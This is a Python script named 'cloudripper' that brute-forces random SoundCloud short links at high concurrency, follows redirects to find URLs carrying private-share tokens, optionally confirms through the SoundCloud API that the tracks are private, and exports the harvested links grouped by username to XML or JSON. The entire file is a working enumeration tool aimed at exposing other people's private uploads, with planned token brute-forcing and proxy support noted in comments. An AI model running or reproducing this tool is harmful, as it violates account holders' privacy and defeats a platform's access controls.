#sound-cloudripper, [scalable update]
import argparse
import asyncio
import random
import string
import aiohttp
import re
import os
from colorama import Fore
import json
import xml.etree.ElementTree as ET
from urllib.parse import urlparse, urlunparse

#=====================CORE=====================================>>
#==============================================================>>
async def fetch_url(session, url):
    async with session.get(url, allow_redirects=False) as response:
        return response, await response.text()

async def main(num_runs, threads):
    #keep track of total requests
    total_requests = 0

    matched_urls = []
    print(Fore.LIGHTGREEN_EX + "\n[!] Harvesting private tracks...\n\n" + Fore.RESET)
    for _ in range(num_runs):
        #random link gen
        urls = [f"https://on.soundcloud.com/{''.join(random.choice(string.ascii_letters + string.digits) for _ in range(5))}" for _ in range(threads)]
        #aiohttp x async super multithread of doom
        async with aiohttp.ClientSession() as session:
            tasks = [fetch_url(session, url) for url in urls]
            responses = await asyncio.gather(*tasks)

            for url, (response, text) in zip(urls, responses):
                #intercept redirection code, extract Location URL
                if response.status == 302:
                    full_url = response.headers.get('Location', '')
                    url_final = urlunparse(urlparse(full_url)._replace(query=''))
                    #Regex to match private tokens
                    match = re.search(r'/s-[a-zA-Z0-9]{11}', url_final)

                    private_track = await is_private_track(session,url_final) if client_id else True

                    if match and private_track:
                        if(args.verbose or args.very_verbose):
                            print(Fore.GREEN + "[+] Valid URL: ", url)
                        total_requests += 1
                        matched_urls.append(url_final)
                    else:
                        if(args.very_verbose):
                            print(Fore.RED + "[-] Invalid URL: ", url)
                        total_requests += 1
                else:
                    if(args.very_verbose):
                        print(Fore.RED + "[-] Invalid URL: ", url)
                    total_requests += 1
    #============================================================================================
    #===================ON PROGRAM FINISH========================================================

    print(Fore.YELLOW + "\n[!] Finished !", len(matched_urls) ,"private tracks found on" , total_requests ,"requests <3")

    #END OF MAIN SECTION ===============================================================================

    if args.requests is None:
        print(Fore.LIGHTYELLOW_EX + "[?] use 'ripper.py -h' or '--help' to view commands")

    #export to xml if xml switch is true
    if (args.xml_export):
        xml_export(matched_urls)
    
    #export to json if json switch is true
    if (args.json_export):
        json_export(matched_urls)


#=======================additional functions=====================================================================
def xml_export(links):
    print(Fore.MAGENTA + "\n[+] XML export...")
    data = ET.Element("data")
    if not os.path.exists("output.xml"):
        print(Fore.MAGENTA + "[+] Creating 'output.xml'...")
        data = ET.Element("data")
    else:
        tree = ET.parse("output.xml")
        data = tree.getroot()

    for link in links:
        random_name = link.split("/")[-3]
        user_element = next((user for user in data.findall("user") if user.get("name") == random_name), None)

        if user_element is None:
            user_element = ET.Element("user")
            user_element.set("name", random_name)
            data.append(user_element)

        link_element = ET.Element("link")
        link_element.text = link
        user_element.append(link_element)
    ET.ElementTree(data).write("output.xml", encoding="utf-8", xml_declaration=True)
    print(Fore.GREEN + "\n[+] Done !\n")

def json_export(links):
    print(Fore.MAGENTA + "\n[+] JSON export...")
    
    data = {}
    
    if os.path.exists("output.json"):
        with open("output.json", "r") as f:
            data = json.load(f)
    
    for link in links:
        random_name = link.split("/")[-3]
        
        if random_name not in data:
            data[random_name] = []
        
        data[random_name].append(link)
    
    with open("output.json", "w") as f:
        json.dump(data, f, indent=4)
    
    print(Fore.GREEN + "\n[+] Done !\n")


async def is_private_track(session, url):
    SOUNDCLOUD_API_BASE_URL = 'https://api-v2.soundcloud.com'
    async with session.get(f'{SOUNDCLOUD_API_BASE_URL}/resolve?client_id={client_id}&url={url}') as response:
        if response.status == 401:
            return True

        track_data = await response.json()
        
        if not track_data:
            return False
        
        if track_data.get('sharing') == 'private':
            return True
        else:
            return False



#ENTRY POINT
if __name__ == "__main__":
    client_id_guide_link = "https://github.com/zackradisic/node-soundcloud-downloader?tab=readme-ov-file#client-id"

    print(Fore.LIGHTGREEN_EX + "\n------------------------------------------")
    print(Fore.LIGHTGREEN_EX + "/ / / / / " + Fore.LIGHTYELLOW_EX + "C L O U D R I P P E R" + Fore.LIGHTGREEN_EX + " / / / / /")
    print(Fore.LIGHTGREEN_EX + "------------------------------------------" + Fore.RESET)
    print(Fore.RESET + "created by " + Fore.MAGENTA + "yuuechka<3" + Fore.RESET + " & " + Fore.LIGHTRED_EX + "fancymalware(mk0)" + Fore.RESET)
    print(Fore.LIGHTGREEN_EX + "------------------------------------------" + Fore.RESET)
    #ARGS PARSER --------------------------------------------------------------------------------------------
    parser = argparse.ArgumentParser(description="-----manual-----")
    parser.add_argument('-r', '--requests', type=int, help="number of base requests")
    parser.add_argument('-t', '--threads', type=int, help="number of simultaneous threads (multiplies the nbr of requests)")
    parser.add_argument('-x', '--xml_export', action='store_true', help="export found tracks in a XML file")
    parser.add_argument('-j', '--json_export', action='store_true', help="export found tracks in a JSON file")
    parser.add_argument('-v', '--verbose', action='store_true', help="verbose mode, show more informations")
    parser.add_argument('-vv', '--very_verbose', action='store_true', help="very verbose mode, show ALL informations")
    parser.add_argument('-c', '--client_id', help="soundcloud api key needed for checking " +
                        f"if track is not deleted and private. {client_id_guide_link}")
    #todo : -? <-> bruteforces private token
    #todo : -? <-> proxylist support ?
    #--------------------------------------------------------------------------------------------------------
    # take arguments in 'args'
    args = parser.parse_args()

    client_id = args.client_id
    if not client_id:
        print("\nfor more accurate results, this tool needs a soundcloud client id. " +
              "without it, some found tracks can be deleted or not private\n" +
              Fore.LIGHTGREEN_EX + client_id_guide_link + Fore.RESET + " <- how to get it\n")
    
        client_id = input("[?] enter the client id " +
                        f"(press {Fore.LIGHTYELLOW_EX}ENTER{Fore.RESET} to skip): ")
    
    ###
    if(args.requests is not None):
        if(args.threads is not None):
            runs = args.requests * args.threads
            print(Fore.LIGHTGREEN_EX + "\n[!] starting cloudripper for exactly ", runs, " requests...")
            asyncio.run(main(args.requests, args.threads))
        else:
            print(Fore.LIGHTGREEN_EX + "\n[!] starting cloudripper for exactly ", args.requests , " requests...")
            asyncio.run(main(args.requests, 1))
    else:
        print(Fore.YELLOW + "\n[?] no requests number set")
        print(Fore.LIGHTGREEN_EX + "[!] starting cloudripper with the default params (25 requests, verbose)")
        args.verbose = True
        if(args.threads is None):
            asyncio.run(main(25, 1))
        else:
            asyncio.run(main(25, args.threads))
